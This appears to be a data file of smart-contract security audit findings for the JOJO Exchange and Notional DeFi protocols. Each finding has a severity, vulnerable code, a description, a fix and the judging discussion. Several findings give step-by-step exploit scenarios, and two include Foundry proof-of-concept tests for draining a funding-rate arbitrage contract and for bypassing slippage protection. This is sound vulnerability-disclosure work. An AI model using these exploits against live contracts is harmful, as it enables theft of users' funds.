All funds can be stolen from JOJODealerчhighч```\n    function executeWithdraw(address from, address to, bool isInternal, bytes memory param) external nonReentrant {\n        Funding.executeWithdraw(state, from, to, isInternal, param);\n    }\n```\nч"`Funding._withdraw()` makes arbitrary call with user specified params. User can for example make ERC20 to himself and steal funds.\nUser can specify parameters `param` and `to` when withdraws:\n```\n    function executeWithdraw(address from, address to, bool isInternal, bytes memory param) external nonReentrant {\n        Funding.executeWithdraw(state, from, to, isInternal, param);\n    }\n```\n\nIn the end of `_withdraw()` function address `to` is called with that bytes param:\n```\n    function _withdraw(\n        Types.State storage state,\n        address spender,\n        address from,\n        address to,\n        uint256 primaryAmount,\n        uint256 secondaryAmount,\n        bool isInternal,\n        bytes memory param\n    )\n        private\n    {\n        // rest of code\n\n        if (param.length != 0) {\n          require(Address.isContract(to), ""target is not a contract"");\n            (bool success,) = to.call(param);\n            if (success == false) {\n                assembly {\n                    let ptr := mload(0x40)\n                    let size := returndatasize()\n                    returndatacopy(ptr, 0, size)\n                    revert(ptr, size)\n                }\n            }\n        }\n    }\n```\n\nAs an attack vector attacker can execute withdrawal of 1 wei to USDC contract and pass calldata to transfer arbitrary USDC amount to himself via USDC contract."чDon't make arbitrary call with user specified params\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid because { This is valid and i can validate it with POC from report 076}\nJoscelynFarr\nFixed PR: https://github.com/JOJOexchange/smart-contract-EVM/commit/763de53a36243490ef46a2c702c5a1480554f286\nIAm0x52\nFix looks good. To must now be a whitelisted contractчAll funds can be stolen from JOJODealer\nCode Snippet\nTool used\nManual Review
FundingRateArbitrage contract can be drained due to rounding errorчhighч"```\njusdOutside[msg.sender] -= repayJUSDAmount;\nuint256 index = getIndex();\nuint256 lockedEarnUSDCAmount = jusdOutside[msg.sender].decimalDiv(index);\nrequire(\n     earnUSDCBalance[msg.sender] >= lockedEarnUSDCAmount, ""lockedEarnUSDCAmount is bigger than earnUSDCBalance""\n);\nwithdrawEarnUSDCAmount = earnUSDCBalance[msg.sender] - lockedEarnUSDCAmount;\n```\n"ч"In the `requestWithdraw`, rounding in the wrong direction is done which can lead to contract being drained.\nIn the `requestWithdraw` function in `FundingRateArbitrage`, we find the following lines of code:\n```\njusdOutside[msg.sender] -= repayJUSDAmount;\nuint256 index = getIndex();\nuint256 lockedEarnUSDCAmount = jusdOutside[msg.sender].decimalDiv(index);\nrequire(\n     earnUSDCBalance[msg.sender] >= lockedEarnUSDCAmount, ""lockedEarnUSDCAmount is bigger than earnUSDCBalance""\n);\nwithdrawEarnUSDCAmount = earnUSDCBalance[msg.sender] - lockedEarnUSDCAmount;\n```\n\nBecause we round down when calculating `lockedEarnUSDCAmount`, `withdrawEarnUSDCAmount` is higher than it should be, which leads to us allowing the user to withdraw more than we should allow them to given the amount of JUSD they repaid.\nThe execution of this is a bit more complicated, let's go through an example. We will assume there's a bunch of JUSD existing in the contract and the attacker is the first to deposit.\nSteps:\nThe attacker deposits `1` unit of USDC and then manually sends in another 100 * 10^6 - `1` (not through deposit, just a transfer). The share price / price per earnUSDC will now be $100. Exactly one earnUSDC is in existence at the moment.\nNext the attacker creates a new EOA and deposits a little over $101 worth of USDC (so that after fees we can get to the $100), giving one earnUSDC to the EOA. The attacker will receive around $100 worth of `JUSD` from doing this.\nAttacker calls `requestWithdraw` with `repayJUSDAmount` = `1` with the second newly created EOA\n`lockedEarnUSDCAmount` is rounded down to 0 (since `repayJUSDAmount` is subtracted from jusdOutside[msg.sender]\n`withdrawEarnUSDCAmount` will be `1`\nAfter `permitWithdrawRequests` is called, attacker will be able to withdraw the $100 they deposited through the second EOA (granted, they lost the deposit and withdrawal fees) while only having sent `1` unit of `JUSD` back. This leads to massive profit for the attacker.\nAttacker can repeat steps 2-6 constantly until the contract is drained of JUSD."чRound up instead of down\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid because { This is valid and also a dupp of 054 due to the same underlying cause of first deposit attack; but in this the watson explained the exploit scenario of the inflation attack}\nnevillehuang\nrequest poc\nsherlock-admin\nPoC requested from @detectiveking123\nRequests remaining: 4\nJoscelynFarr\nI think this issue is similar to https://github.com/sherlock-audit/2023-12-jojo-exchange-update-judging/issues/54\nnevillehuang\n@JoscelynFarr Seems right, @detectiveking123 do you agree that this seems to be related to a typical first depositor inflation attack.\ndetectiveking123\n@nevillehuang I am not exactly sure how this should be judged.\nThe attack that I describe here chains two separate vulnerabilities together (one of which is the rounding error and the other which is the same root cause as the share inflation attack) to drain all the funds existing in the contract, which is clearly a high. It also doesn't rely on any front-running on Arbitrum assumptions, while the other issue does. In fact, no interaction from any other users is necessary for the attacker to drain all the funds. The exploit that is described in the other issue cannot actually drain all the funds in the contract like this one can, but simply drain user deposits if they can frontrun them.\nTo clarify, the rounding error that I describe here is different from the rounding error described in the ERC4626 inflation style exploit (so I guess there are two separate rounding errors that optimally should be chained together for this exploit).\nDo you still want me to provide a code POC here? I already have an example in the issue description of how the attack can be performed.\nnevillehuang\n@detectiveking123 Yes, please provide me a coded PoC in 1-2 days so that I can verify the draining impact, because it does share similar root causes of direct donation of funds as the first inflation attack.\ndetectiveking123\n@nevillehuang let me get it to you by tomorrow\ndetectiveking123\n@nevillehuang\n```\n    function testExploit() public {\n        jusd.mint(address(fundingRateArbitrage), 5000e6);\n        // net value starts out at 0 :)\n        console.log(fundingRateArbitrage.getNetValue());\n\n        vm.startPrank(Owner); \n        fundingRateArbitrage.setMaxNetValue(10000000e6); \n        fundingRateArbitrage.setDefaultQuota(10000000e6); \n        vm.stopPrank(); \n                 \n        initAlice();\n        // Alice deposits twice\n        fundingRateArbitrage.deposit(1);\n        USDC.transfer(address(fundingRateArbitrage), 100e6);\n        fundingRateArbitrage.deposit(100e6);\n        vm.stopPrank();\n\n        vm.startPrank(alice);\n        fundingRateArbitrage.requestWithdraw(1);\n        fundingRateArbitrage.requestWithdraw(1);\n        vm.stopPrank();\n\n        vm.startPrank(Owner); \n        uint256[] memory requestIds = new uint256[](2);\n        requestIds[0] = 0; \n        requestIds[1] = 1;\n        fundingRateArbitrage.permitWithdrawRequests(requestIds); \n        vm.stopPrank(); \n\n        // Alice is back to her initial balance, but now has a bunch of extra JUSD deposited for her into jojodealer!\n        console.log(USDC.balanceOf(alice));\n        (,uint secondaryCredit,,,) = jojoDealer.getCreditOf(alice);\n        console.log(secondaryCredit);\n    }\n```\n\nYou will also need to add:\n```\n    function transfer(address to, uint256 amount) public override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n```\n\nto TestERC20\nAnd change initAlice to:\n```\n    function initAlice() public {\n        USDC.mint(alice, 300e6 + 1);\n        jusd.mint(alice, 300e6 + 1);\n        vm.startPrank(alice);\n        USDC.approve(address(fundingRateArbitrage), 300e6 + 1);\n        jusd.approve(address(fundingRateArbitrage), 300e6 + 1); \n    }\n```\n\nFYI for this exploit the share inflation is helpful but not necessary. The main issue is the rounding down of `lockedEarnUSDCAmount` in `requestWithdraw`. Even if the share price is 1 cent for example, we will slowly be able to drain JUSD from the contract. An assumption for profitability is that the share price is nontrivial though (so if it's really small it won't be profitable for the attacker b/c of gas fees and deposit fees, though you can still technically drain).\nnevillehuang\nThis issue is exactly the same as #21 and the original submission shares the same root cause of depositor inflation to make the attack feasible, given share price realistically won't be of such a low price. I will be duplicating accordingly. Given and subsequent deposits can be drained, I will be upgrading to high severity\n@detectiveking123 If you want to escalate feel free,I will maintain my stance here.\nIAm0x52\nSame fix as #54чAll JUSD in the contract can be drained\nCode Snippet\nTool used\nManual Review
Lender transactions can be front-run, leading to lost fundsчhighч```\n    function mintViaUnderlying(\n        uint256 depositAmountExternal,\n        uint88 fCashAmount,\n        address receiver,\n        uint32 minImpliedRate//@audit when lendAmount bigger than maxFCash lack of minRate protect.\n    ) external override {\n        (/* */, uint256 maxFCash) = getTotalFCashAvailable();\n        _mintInternal(depositAmountExternal, fCashAmount, receiver, minImpliedRate, maxFCash);\n    }\n```\nч"Users can mint wfCash tokens via `mintViaUnderlying` by passing a variable `minImpliedRate` to guard against trade slippage. If the market interest is lower than expected by the user, the transaction will revert due to slippage protection. However, if the user mints a share larger than maxFCash, the `minImpliedRate` check is not performed.\n```\n    function mintViaUnderlying(\n        uint256 depositAmountExternal,\n        uint88 fCashAmount,\n        address receiver,\n        uint32 minImpliedRate//@audit when lendAmount bigger than maxFCash lack of minRate protect.\n    ) external override {\n        (/* */, uint256 maxFCash) = getTotalFCashAvailable();\n        _mintInternal(depositAmountExternal, fCashAmount, receiver, minImpliedRate, maxFCash);\n    }\n```\n\n```\n        if (maxFCash < fCashAmount) {\n            // NOTE: lending at zero\n            uint256 fCashAmountExternal = fCashAmount * precision / uint256(Constants.INTERNAL_TOKEN_PRECISION);//@audit-info fCashAmount * (underlyingTokenDecimals) / 1e8\n            require(fCashAmountExternal <= depositAmountExternal);\n\n            // NOTE: Residual (depositAmountExternal - fCashAmountExternal) will be transferred\n            // back to the account\n            NotionalV2.depositUnderlyingToken{value: msgValue}(address(this), currencyId, fCashAmountExternal);//@audit check this.\n        } \n```\n\nImagine the following scenario:\nlender deposit Underlying token to `mint` some shares and set a `minImpliedRate` to protect the trsanction\nalice front-run her transaction invoke `mint` to `mint` some share\nthe shares of lender `mint` now is bigger than `maxFCash`\nnow the lender `lending at zero`\n```\n    function testDepositViaUnderlying() public {\n        address alice = makeAddr(""alice"");\n        deal(address(asset), LENDER, 8800 * precision, true);\n        deal(address(asset), alice, 5000 * precision, true);\n\n        //alice deal.\n        vm.stopPrank();\n        vm.startPrank(alice);\n        asset.approve(address(w), type(uint256).max);\n        \n        //==============================LENDER START=============================//\n        vm.stopPrank();\n        vm.startPrank(LENDER);\n        asset.approve(address(w), type(uint256).max);\n        //user DAI balance before:\n        assertEq(asset.balanceOf(LENDER), 8800e18);\n\n        (/* */, uint256 maxFCash) = w.getTotalFCashAvailable();\n        console2.log(""current maxFCash:"",maxFCash);\n\n        //LENDER mintViaUnderlying will revert due to slippage.\n        uint32 minImpliedRate = 0.15e9;\n        vm.expectRevert(""Trade failed, slippage"");\n        w.mintViaUnderlying(5000e18,5000e8,LENDER,minImpliedRate);\n        //==============================LENDER END=============================//\n\n        //======================alice frontrun to mint some shares.============//\n        vm.stopPrank();\n        vm.startPrank(alice);\n        w.mint(5000e8,alice);\n\n        //==========================LENDER TX =================================//\n        vm.stopPrank();\n        vm.startPrank(LENDER);\n        asset.approve(address(w), type(uint256).max);\n        //user DAI balance before:\n        assertEq(asset.balanceOf(LENDER), 8800e18);\n\n        //LENDER mintViaUnderlying will success.\n        w.mintViaUnderlying(5000e18,5000e8,LENDER,minImpliedRate);\n\n        console2.log(""lender mint token:"",w.balanceOf(LENDER));\n        console2.log(""lender cost DAI:"",8800e18 - asset.balanceOf(LENDER));\n    }\n```\n\nFrom the above test, we can observe that if `maxFCasha` is greater than `5000e8`, the lender's transaction will be reverted due to ""Trade failed, slippage."" Subsequently, if Alice front-runs by invoking `mint` to create some shares before the lender, the lender's transaction will succeed. Therefore, the lender's `minImpliedRate` check will be bypassed, leading to a loss of funds for the lender."ч"add a check inside `_mintInternal`\n```\n        if (maxFCash < fCashAmount) {\n// Add the line below\n          require(minImpliedRate ==0,""Trade failed, slippage"");            \n            // NOTE: lending at zero\n            uint256 fCashAmountExternal = fCashAmount * precision / uint256(Constants.INTERNAL_TOKEN_PRECISION);//@audit-info fCashAmount * (underlyingTokenDecimals) / 1e8\n            require(fCashAmountExternal <= depositAmountExternal);\n\n            // NOTE: Residual (depositAmountExternal - fCashAmountExternal) will be transferred\n            // back to the account\n            NotionalV2.depositUnderlyingToken{value: msgValue}(address(this), currencyId, fCashAmountExternal);//@audit check this.\n        }\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid because { This is valid as the watson explained how the slippage chack can be bypassed via front-running the users deposit}"чlender lost of funds\nCode Snippet\n```\n        if (maxFCash < fCashAmount) {\n            // NOTE: lending at zero\n            uint256 fCashAmountExternal = fCashAmount * precision / uint256(Constants.INTERNAL_TOKEN_PRECISION);//@audit-info fCashAmount * (underlyingTokenDecimals) / 1e8\n            require(fCashAmountExternal <= depositAmountExternal);\n\n            // NOTE: Residual (depositAmountExternal - fCashAmountExternal) will be transferred\n            // back to the account\n            NotionalV2.depositUnderlyingToken{value: msgValue}(address(this), currencyId, fCashAmountExternal);//@audit check this.\n        } \n```\n\nTool used\nFoundry Manual Review
_isExternalLendingUnhealthy() using stale factorsчmediumч```\n    function _isExternalLendingUnhealthy(\n        uint16 currencyId,\n        IPrimeCashHoldingsOracle oracle,\n        PrimeRate memory pr\n    ) internal view returns (bool isExternalLendingUnhealthy, OracleData memory oracleData, uint256 targetAmount) {\n// rest of code\n\n      PrimeCashFactors memory factors = PrimeCashExchangeRate.getPrimeCashFactors(currencyId);\n        Token memory underlyingToken = TokenHandler.getUnderlyingToken(currencyId);\n\n        targetAmount = ExternalLending.getTargetExternalLendingAmount(\n            underlyingToken, factors, rebalancingTargetData, oracleData, pr\n        );\n```\nчIn `checkRebalance()` -> _isExternalLendingUnhealthy() -> getTargetExternalLendingAmount(factors) using stale `factors` will lead to inaccurate `targetAmount`, which in turn will cause `checkRebalance()` that should have been rebalance to not execute.\nrebalancingBot uses `checkRebalance()` to return the `currencyIds []` that need to be `rebalance`.\ncall order : `checkRebalance()` -> `_isExternalLendingUnhealthy()` -> `ExternalLending.getTargetExternalLendingAmount(factors)`\n```\n    function _isExternalLendingUnhealthy(\n        uint16 currencyId,\n        IPrimeCashHoldingsOracle oracle,\n        PrimeRate memory pr\n    ) internal view returns (bool isExternalLendingUnhealthy, OracleData memory oracleData, uint256 targetAmount) {\n// rest of code\n\n      PrimeCashFactors memory factors = PrimeCashExchangeRate.getPrimeCashFactors(currencyId);\n        Token memory underlyingToken = TokenHandler.getUnderlyingToken(currencyId);\n\n        targetAmount = ExternalLending.getTargetExternalLendingAmount(\n            underlyingToken, factors, rebalancingTargetData, oracleData, pr\n        );\n```\n\nA very important logic is to get `targetAmount`. The calculation of this value depends on `factors`. But currently used is PrimeCashFactors memory `factors` = PrimeCashExchangeRate.getPrimeCashFactors(currencyId);. This is not the latest. It has not been aggregated yet. The correct one should be `( /* */,factors) = PrimeCashExchangeRate.getPrimeCashRateView();`.ч"
recover() using the standard transfer may not be able to retrieve some tokensчmediumч"```\n    function recover(address token, uint256 amount) external onlyOwner {\n        if (Constants.ETH_ADDRESS == token) {\n            (bool status,) = msg.sender.call{value: amount}("""");\n            require(status);\n        } else {\n          IERC20(token).transfer(msg.sender, amount);\n        }\n    }\n```\n"ч"in `SecondaryRewarder.recover()` Using the standard `IERC20.transfer()` If `REWARD_TOKEN` is like `USDT`, it will not be able to transfer out, because this kind of `token` does not return `bool` This will cause it to always `revert`\n`SecondaryRewarder.recover()` use for\nAllows the Notional owner to recover any tokens sent to the address or any reward tokens remaining on the contract in excess of the total rewards emitted.\n```\n    function recover(address token, uint256 amount) external onlyOwner {\n        if (Constants.ETH_ADDRESS == token) {\n            (bool status,) = msg.sender.call{value: amount}("""");\n            require(status);\n        } else {\n          IERC20(token).transfer(msg.sender, amount);\n        }\n    }\n```\n\nUsing the standard `IERC20.transfer()` method to execute the transfer A `token` of a type similar to `USDT` has no return value This will cause the execution of the transfer to always fail"ч"```\n    function recover(address token, uint256 amount) external onlyOwner {\n        if (Constants.ETH_ADDRESS == token) {\n            (bool status,) = msg.sender.call{value: amount}("""");\n            require(status);\n        } else {\n// Remove the line below\n          IERC20(token).transfer(msg.sender, amount);\n// Add the line below\n          GenericToken.safeTransferOut(token,msg.sender,amount);\n        }\n    }\n```\n\nDiscussion\nnevillehuang\n@jeffywu @T-Woodward Were there any publicly available information stating USDT won't be use as a potential reward tokens at the point of the contest?\nsherlock-admin2\nEscalate Upon closer examination and in alignment with the Sherlock rules, it becomes evident that issues of this nature are categorically classified under informational issues. Furthermore, should we acknowledge the concerns surrounding `safeTransferOut` due to `USDT` peculiarities, it is imperative to underscore that, at most, this warrants a classification of low severity. This is primarily because the core functionality of the protocol remains unaffected and fully operational without getting bricked.\nYou've deleted an escalation for this issue.\nAuditorPraise\nEscalate Upon closer examination and in alignment with the Sherlock rules, it becomes evident that issues of this nature are categorically classified under informational issues. Furthermore, should we acknowledge the concerns surrounding `safeTransferOut` due to `USDT` peculiarities, it is imperative to underscore that, at most, this warrants a classification of low severity. This is primarily because the core functionality of the protocol remains unaffected and fully operational without getting bricked.\n""Non-Standard tokens: Issues related to tokens with non-standard behaviors, such as weird-tokens are not considered valid by default unless these tokens are explicitly mentioned in the README""\ncontest readme::\n```\n Do you expect to use any of the following tokens with non-standard behaviour with the smart contracts?\n\nUSDC and USDT are the primary examples.\n```\n\n0xMR0\nEscalate\nThis is indeed a valid issue since the non-standard behavior of USDT is not acceptable to protocol team and it is explicitly mentioned in contest readme.\nFurther, comment by @AuditorPraise is correct and enough for the validation of this issue.\nsherlock-admin2\nEscalate\nThis is indeed a valid issue since the non-standard behavior of USDT is not acceptable to protocol team and it is explicitly mentioned in contest readme.\nFurther, comment by @AuditorPraise is correct and enough for the validation of this issue.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nHash01011122\nIMO In my opinion, the issue with `safeTransfer` has been widely recognized since 2022. Furthermore, it seems unfair to Watson who are discovering different vulnerabilities along with their attack paths. For instance, the issue of hardcoded `chainId` was previously classified as high severity. However, as seen in this issue, it was downgraded to low severity due to its widespread awareness and ease of discovery.\nAs mentioned in sherlock rules: Low/Informational Issues: While Sherlock acknowledges that it would be great to include & reward low-impact/informational issues, we strongly feel that Watsons should focus on finding the most critical vulnerabilities that will potentially cause millions of dollars of losses on mainnet. Sherlock understands that it could be missing out on some potential ""value add"" for protocol, but it's only because the real task of finding critical vulnerabilities requires 100% of the attention of Watsons. While low/informational issues are not rewarded individually if a Watson identifies an attack vector that combines multiple lows to cause significant loss/damage that would still be categorized as a valid medium/high.\nAuditorPraise\nIMO In my opinion, the issue with `safeTransfer` has been widely recognized since 2022.\nThe issue isn't about `safeTransfer` but USDT. It's no one's fault that devs still make such mistakes... But that doesn't reduce the risks associated with making such a mistake. The impact it has had on protocols since 2022 till now remains the same.\nFunds could be stuck\nSo why should it be an informational now?\nYou can't compare chain Id issue to USDT being stuck in a contract as a result of the devs not using safeTransfer.\nnevillehuang\n@Hash01011122 You are circling too much around sherlock rules, and should look at it more factually instead of subjectively. In the contest details/code logic/documentation, no place does it mention that USDT cannot be a reward token, so I believe your argument is basically invalid. I believe no further discussions is required from my side, imo, this should remain medium severity.\nEvert0x\nResult: Medium Has Duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\n0xMR0: accepted"чIf `REWARD_TOKEN` is like `USDT`, it will not be able to transfer out.\nCode Snippet\nTool used\nManual Review
Malicious users could block liquidation or perform DOSчmediumч```\n_claimRewards -> claimRewardsDirect\n\n_claimRewards -> claimRewards -> Incentives.claimIncentives\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler._finalize\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler._finalize -> Used by many functions\n\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler.claimIncentivesManual\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler.claimIncentivesManual -> nTokenAction.nTokenClaimIncentives (External)\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler.claimIncentivesManual -> nTokenAction.nTokenClaimIncentives (External) -> claimNOTE (External)\n```\nч"The current implementation uses a ""push"" approach where reward tokens are sent to the recipient during every update, which introduces additional attack surfaces that the attackers can exploit. An attacker could intentionally affect the outcome of the transfer to gain a certain advantage or carry out certain attack.\nThe worst-case scenario is that malicious users might exploit this trick to intentionally trigger a revert when someone attempts to liquidate their unhealthy accounts to block the liquidation, leaving the protocol with bad debts and potentially leading to insolvency if it accumulates.\nPer the Audit Scope Documentation provided by the protocol team on the contest page, the reward tokens can be any arbitrary ERC20 tokens\nWe are extending this functionality to allow nTokens to be incentivized by a secondary reward token. On Arbitrum, this will be ARB as a result of the ARB STIP grant. In the future, this may be any arbitrary ERC20 token\nLine 231 of the `_claimRewards` function below might revert due to various issues such as:\ntokens with blacklisting features such as USDC (users might intentionally get into the blacklist to achieve certain outcomes)\ntokens with hook, which allow the target to revert the transaction intentionally\nunexpected error in the token's contract\nIf a revert occurs, the following functions are affected:\n```\n_claimRewards -> claimRewardsDirect\n\n_claimRewards -> claimRewards -> Incentives.claimIncentives\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler._finalize\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler._finalize -> Used by many functions\n\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler.claimIncentivesManual\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler.claimIncentivesManual -> nTokenAction.nTokenClaimIncentives (External)\n_claimRewards -> claimRewards -> Incentives.claimIncentives -> BalancerHandler.claimIncentivesManual -> nTokenAction.nTokenClaimIncentives (External) -> claimNOTE (External)\n```\n"ч"The current implementation uses a ""push"" approach where reward tokens are sent to the recipient during every update, which introduces additional attack surfaces that the attackers can exploit.\nConsider adopting a pull method for users to claim their rewards instead so that the transfer of reward tokens is disconnected from the updating of reward balances.\nDiscussion\njeffywu\nI believe this is a duplicate of another issue.\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid because { valid user can avoid liquidation}\njeffywu\nAcknowledged this is a very minor risk in the case this prevents a liquidation. However, I think the fix here is to put a try / catch around the reward block and it results in a loss of rewards for the blacklisted account rather than changing the entire UX of the process."чMany of the core functionalities of the protocol will be affected by the revert. Specifically, the `BalancerHandler._finalize` has the most impact as this function is called by almost every critical functionality of the protocol, including deposit, withdrawal, and liquidation.\nThe worst-case scenario is that malicious users might exploit this trick to intentionally trigger a revert when someone attempts to liquidate their unhealthy accounts to block the liquidation, leaving the protocol with bad debts and potentially leading to insolvency if it accumulates.\nCode Snippet\nTool used\nManual Review
getOracleData() maxExternalDeposit not accurateчmediumч```\n    function getOracleData() external view override returns (OracleData memory oracleData) {\n// rest of code\n        (/* */, uint256 supplyCap) = IPoolDataProvider(POOL_DATA_PROVIDER).getReserveCaps(underlying);\n        // Supply caps are returned as whole token values\n        supplyCap = supplyCap * UNDERLYING_PRECISION;\n        uint256 aTokenSupply = IPoolDataProvider(POOL_DATA_PROVIDER).getATokenTotalSupply(underlying);\n\n        // If supply cap is zero, that means there is no cap on the pool\n        if (supplyCap == 0) {\n            oracleData.maxExternalDeposit = type(uint256).max;\n        } else if (supplyCap <= aTokenSupply) {\n            oracleData.maxExternalDeposit = 0;\n        } else {\n            // underflow checked as consequence of if / else statement\n          oracleData.maxExternalDeposit = supplyCap - aTokenSupply;\n        }\n```\nчin `getOracleData()` The calculation of `maxExternalDeposit` lacks consideration for `reserve.accruedToTreasury`. This leads to `maxExternalDeposit` being too large, causing `Treasury.rebalance()` to fail.\nin `getOracleData()`\n```\n    function getOracleData() external view override returns (OracleData memory oracleData) {\n// rest of code\n        (/* */, uint256 supplyCap) = IPoolDataProvider(POOL_DATA_PROVIDER).getReserveCaps(underlying);\n        // Supply caps are returned as whole token values\n        supplyCap = supplyCap * UNDERLYING_PRECISION;\n        uint256 aTokenSupply = IPoolDataProvider(POOL_DATA_PROVIDER).getATokenTotalSupply(underlying);\n\n        // If supply cap is zero, that means there is no cap on the pool\n        if (supplyCap == 0) {\n            oracleData.maxExternalDeposit = type(uint256).max;\n        } else if (supplyCap <= aTokenSupply) {\n            oracleData.maxExternalDeposit = 0;\n        } else {\n            // underflow checked as consequence of if / else statement\n          oracleData.maxExternalDeposit = supplyCap - aTokenSupply;\n        }\n```\n\n```\n    require(\n      supplyCap == 0 ||\n        ((IAToken(reserveCache.aTokenAddress).scaledTotalSupply() +\n          uint256(reserve.accruedToTreasury)).rayMul(reserveCache.nextLiquidityIndex) + amount) <=\n        supplyCap * (10 ** reserveCache.reserveConfiguration.getDecimals()),\n      Errors.SUPPLY_CAP_EXCEEDED\n    );\n  }\n```\n\nThe current implementation lacks subtraction of `uint256(reserve.accruedToTreasury)).rayMul(reserveCache.nextLiquidityIndex)`.ч
getTargetExternalLendingAmount() when targetUtilization == 0 no check whether enough externalUnderlyingAvailableForWithdrawчmediumч```\n    function getTargetExternalLendingAmount(\n        Token memory underlyingToken,\n        PrimeCashFactors memory factors,\n        RebalancingTargetData memory rebalancingTargetData,\n        OracleData memory oracleData,\n        PrimeRate memory pr\n    ) internal pure returns (uint256 targetAmount) {\n        // Short circuit a zero target\n      if (rebalancingTargetData.targetUtilization == 0) return 0;\n\n// rest of code.\n        if (targetAmount < oracleData.currentExternalUnderlyingLend) {\n            uint256 forRedemption = oracleData.currentExternalUnderlyingLend - targetAmount;\n            if (oracleData.externalUnderlyingAvailableForWithdraw < forRedemption) {\n                // increase target amount so that redemptions amount match externalUnderlyingAvailableForWithdraw\n                targetAmount = targetAmount.add(\n                    // unchecked - is safe here, overflow is not possible due to above if conditional\n                    forRedemption - oracleData.externalUnderlyingAvailableForWithdraw\n                );\n            }\n        }\n```\nчin `getTargetExternalLendingAmount()` When `targetUtilization == 0`, it directly returns `targetAmount=0`. It lacks the judgment of whether there is enough `externalUnderlyingAvailableForWithdraw`. This may cause `_rebalanceCurrency()` to `revert` due to insufficient balance for `withdraw`.\nwhen `setRebalancingTargets()` , we can setting all the targets to zero to immediately exit money it will call `_rebalanceCurrency() -> _isExternalLendingUnhealthy() -> getTargetExternalLendingAmount()`\n```\n    function getTargetExternalLendingAmount(\n        Token memory underlyingToken,\n        PrimeCashFactors memory factors,\n        RebalancingTargetData memory rebalancingTargetData,\n        OracleData memory oracleData,\n        PrimeRate memory pr\n    ) internal pure returns (uint256 targetAmount) {\n        // Short circuit a zero target\n      if (rebalancingTargetData.targetUtilization == 0) return 0;\n\n// rest of code.\n        if (targetAmount < oracleData.currentExternalUnderlyingLend) {\n            uint256 forRedemption = oracleData.currentExternalUnderlyingLend - targetAmount;\n            if (oracleData.externalUnderlyingAvailableForWithdraw < forRedemption) {\n                // increase target amount so that redemptions amount match externalUnderlyingAvailableForWithdraw\n                targetAmount = targetAmount.add(\n                    // unchecked - is safe here, overflow is not possible due to above if conditional\n                    forRedemption - oracleData.externalUnderlyingAvailableForWithdraw\n                );\n            }\n        }\n```\n\nWhen `targetUtilization==0`, it returns `targetAmount ==0`. It lacks the other judgments of whether the current `externalUnderlyingAvailableForWithdraw` is sufficient. Exceeding `externalUnderlyingAvailableForWithdraw` may cause `_rebalanceCurrency()` to revert.\nFor example: `currentExternalUnderlyingLend = 100` `externalUnderlyingAvailableForWithdraw = 99` If `targetUtilization` is modified to `0`, then `targetAmount` should be `1`, not `0`. `0` will cause an error due to insufficient available balance for withdrawal.\nSo, it should still try to withdraw as much deposit as possible first, wait for replenishment, and then withdraw the remaining deposit until the deposit is cleared.чRemove `targetUtilization == 0` directly returning 0.\nThe subsequent logic of the method can handle `targetUtilization == 0` normally and will not cause an error.\n```\n    function getTargetExternalLendingAmount(\n        Token memory underlyingToken,\n        PrimeCashFactors memory factors,\n        RebalancingTargetData memory rebalancingTargetData,\n        OracleData memory oracleData,\n        PrimeRate memory pr\n    ) internal pure returns (uint256 targetAmount) {\n        // Short circuit a zero target\n// Remove the line below\n       if (rebalancingTargetData.targetUtilization == 0) return 0;\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid because {valid medium and a duplicate of 052}\nnevillehuang\n@jeffywu Is the impact of this significant and can compound to cause a material enough loss due to inability to rebalance? Also who is responsible for maintaining a high enough `externalUnderlyingAvailableForWithdraw`?\njeffywu\nHmm, I guess this would be tripped if governance tries to set the target utilization to zero. Likely, this occurs if we want to pull funds very quickly from an external lending protocol. The check is important to ensure that we pull as much funds as we can without reverting.\nThis issue would significantly hamper our ability to get out of a lending protocol quickly. A higher severity could be justified.чA too small `targetAmount` may cause AAVE withdraw to fail, thereby causing the inability to `setRebalancingTargets()` to fail.\nCode Snippet\nTool used\nManual Review
getTargetExternalLendingAmount() targetAmount may far less than the correct valueчmediumч```\n    function getTargetExternalLendingAmount(\n        Token memory underlyingToken,\n        PrimeCashFactors memory factors,\n        RebalancingTargetData memory rebalancingTargetData,\n        OracleData memory oracleData,\n        PrimeRate memory pr\n    ) internal pure returns (uint256 targetAmount) {\n// rest of code\n\n        targetAmount = SafeUint256.min(\n            // totalPrimeCashInUnderlying and totalPrimeDebtInUnderlying are in 8 decimals, convert it to native\n            // token precision here for accurate comparison. No underflow possible since targetExternalUnderlyingLend\n            // is floored at zero.\n            uint256(underlyingToken.convertToExternal(targetExternalUnderlyingLend)),\n            // maxExternalUnderlyingLend is limit enforced by setting externalWithdrawThreshold\n            // maxExternalDeposit is limit due to the supply cap on external pools\n          SafeUint256.min(maxExternalUnderlyingLend, oracleData.maxExternalDeposit)\n        );\n```\nчWhen calculating `ExternalLending.getTargetExternalLendingAmount()`, it restricts `targetAmount` greater than `oracleData.maxExternalDeposit`. However, it does not take into account that `oracleData.maxExternalDeposit` includes the protocol deposit `currentExternalUnderlyingLend` This may result in the returned quantity being far less than the correct quantity.\nin `getTargetExternalLendingAmount()` It restricts `targetAmount` greater than `oracleData.maxExternalDeposit`.\n```\n    function getTargetExternalLendingAmount(\n        Token memory underlyingToken,\n        PrimeCashFactors memory factors,\n        RebalancingTargetData memory rebalancingTargetData,\n        OracleData memory oracleData,\n  